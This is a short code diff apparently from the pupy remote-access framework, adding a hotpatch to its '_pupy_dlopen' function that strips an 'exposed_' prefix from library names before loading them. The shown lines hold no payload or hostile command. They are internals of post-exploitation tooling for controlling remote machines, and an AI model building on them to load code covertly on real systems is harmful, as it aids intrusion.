@@ -57,6 +57,11 @@ def _pupy_find_library(name):
 
 def _pupy_dlopen(name, *args, **kwargs):
     pupy.dprint('ctypes dlopen: {}', name)
+
+    if name and name.startswith("exposed_"):
+        pupy.dprint('_pupy_dlopen: RPYC hotpatch : renaming %s to %s'%(name, name[8:]))
+        name=name[8:]
+
     name = _pupy_make_library_path(name)
     pupy.dprint(
         'ctypes dlopen / pupyized: {} (system {})',
